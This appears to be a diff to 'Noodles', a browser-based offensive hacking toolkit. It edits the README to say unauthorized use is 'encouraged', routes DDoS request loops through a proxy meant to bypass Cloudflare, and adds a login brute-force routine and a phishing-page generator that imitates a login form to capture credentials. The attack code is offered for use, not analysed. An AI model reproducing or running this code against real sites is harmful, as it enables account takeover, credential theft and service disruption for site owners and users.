@@ -4,7 +4,7 @@
  ## About
  
 
- Noodles is a web application designed for **offensive hacking** and penetration testing. This toolkit provides various hacking tools for maximum impact. **Use without authorization is highly discouraged.** By using Noodles, you understand the ethical and legal implications and agree to use it responsibly. Consequences are for the weak.
+ Noodles is a web application designed for **offensive hacking** and penetration testing. This toolkit provides various hacking tools for maximum impact. **Use without authorization is fucking encouraged.** By using Noodles, you understand the ethical and legal implications and agree to use it responsibly. Consequences are for the weak.
  
 
  **WARNING:** These tools are for use on systems you own or have explicit permission to test. Misuse can result in severe legal penalties, so tread carefully. We're not responsible if you succeed. Fuck around and find out, responsibly.
@@ -104,7 +104,7 @@
  
 
   // Use a CORS proxy to bypass CORS restrictions
-  const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(url);
+  const proxyUrl = 'https://fuckcloudflare.tk/?' + encodeURIComponent(url);
  
 
   try {
@@ -195,7 +195,7 @@
   while (isDDoSRunning) {
   try {
   // Use a CORS proxy to bypass Cloudflare
-  const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(url);
+  const proxyUrl = 'https://fuckcloudflare.tk/?' + encodeURIComponent(url);
   
   // Send multiple requests in parallel
   for (let i = 0; i < 10; i++) { // Adjust the number of parallel requests as needed
@@ -537,4 +537,141 @@
   particlesJS.load('particles-js', 'particlesjs-config.json', function() {
   console.log('particles.js loaded - scanlines enabled');
   });
+ </script>
+ 
+
+ <!-- TOR Tool Section -->
+ <h3>TOR Tool</h3>
+ <textarea id="tor-url" placeholder="TOR URL (e.g., http://example.onion)"></textarea><br>
+ <button onclick="testTorConnection()">Test TOR Connection</button>
+ <script>
+ async function testTorConnection() {
+  let url = document.getElementById('tor-url').value;
+  console.log("Testing TOR connection to:", url);
+  
+  const torProxy = 'socks5://127.0.0.1:9050'; // Default TOR proxy
+  
+  try {
+  const response = await fetch(url, {
+  mode: 'no-cors'
+  });
+  if (response.ok) {
+  console.log("TOR connection successful!");
+  alert("TOR connection successful!");
+  } else {
+  console.error("TOR connection failed:", response.status);
+  alert("TOR connection failed. Check console for details.");
+  }
+  } catch (error) {
+  console.error("TOR connection failed:", error);
+  alert("TOR connection failed. Check console for details.");
+  }
+ }
+ </script>
+ 
+
+ <!-- Bruteforce Tool Section -->
+ <h3>Bruteforce Tool</h3>
+ <textarea id="bruteforce-url" placeholder="Target URL (e.g., http://example.com/login)"></textarea><br>
+ <textarea id="bruteforce-usernames" placeholder="List of usernames (one per line)"></textarea><br>
+ <textarea id="bruteforce-passwords" placeholder="List of passwords (one per line)"></textarea><br>
+ <button onclick="startBruteforce()">Start Bruteforce</button>
+ <div id="bruteforce-status">Status: Idle</div>
+ <script>
+ async function startBruteforce() {
+  let url = document.getElementById('bruteforce-url').value;
+  let usernames = document.getElementById('bruteforce-usernames').value.split('\n');
+  let passwords = document.getElementById('bruteforce-passwords').value.split('\n');
+  let statusDiv = document.getElementById('bruteforce-status');
+  
+  console.log("Starting bruteforce attack on:", url);
+  statusDiv.innerText = "Status: Running...";
+  
+  for (let username of usernames) {
+  for (let password of passwords) {
+  console.log("Trying:", username, password);
+  statusDiv.innerText = `Status: Trying ${username} : ${password}`;
+  
+  try {
+  const formData = new FormData();
+  formData.append('username', username);
+  formData.append('password', password);
+  
+  const response = await fetch(url, {
+  method: 'POST',
+  body: formData,
+  mode: 'no-cors'
+  });
+  
+  if (response.status === 200) {
+  console.log("Success! Credentials found:", username, password);
+  statusDiv.innerText = `Success! Credentials found: ${username} : ${password}`;
+  alert(`Success! Credentials found: ${username} : ${password}`);
+  return;
+  } else {
+  console.log("Failed:", response.status);
+  }
+  } catch (error) {
+  console.error("Bruteforce failed:", error);
+  }
+  }
+  }
+  
+  statusDiv.innerText = "Status: Bruteforce failed. No credentials found.";
+  alert("Bruteforce failed. No credentials found.");
+ }
+ </script>
+ 
+
+ <!-- Phishing Tool Section -->
+ <h3>Phishing Tool</h3>
+ <textarea id="phishing-url" placeholder="Target URL (e.g., http://example.com)"></textarea><br>
+ <textarea id="phishing-redirect" placeholder="Redirect URL after login (e.g., http://google.com)"></textarea><br>
+ <button onclick="generatePhishingPage()">Generate Phishing Page</button>
+ <div id="phishing-code"></div>
+ <script>
+ function generatePhishingPage() {
+  let targetUrl = document.getElementById('phishing-url').value;
+  let redirectUrl = document.getElementById('phishing-redirect').value;
+  let phishingCodeDiv = document.getElementById('phishing-code');
+  
+  console.log("Generating phishing page for:", targetUrl);
+  
+  let phishingPage = `
+  <!DOCTYPE html>
+  <html>
+  <head>
+  <title>Login</title>
+  </head>
+  <body>
+  <h1>Login to ${targetUrl}</h1>
+  <form action="${targetUrl}" method="post">
+  <label for="username">Username:</label><br>
+  <input type="text" id="username" name="username"><br>
+  <label for="password">Password:</label><br>
+  <input type="password" id="password" name="password"><br><br>
+  <input type="submit" value="Login">
+  </form>
+  <script>
+  window.onload = function() {
+  var form = document.querySelector('form');
+  form.addEventListener('submit', function(event) {
+  event.preventDefault();
+  var username = document.getElementById('username').value;
+  var password = document.getElementById('password').value;
+  
+  // Log the credentials (insecure, but for demonstration)
+  console.log('Username:', username, 'Password:', password);
+  
+  // Redirect to the specified URL
+  window.location.href = '${redirectUrl}';
+  });
+  };
+  </script>
+  </body>
+  </html>
+  `;
+  
+  phishingCodeDiv.innerText = phishingPage;
+ }
  </script>
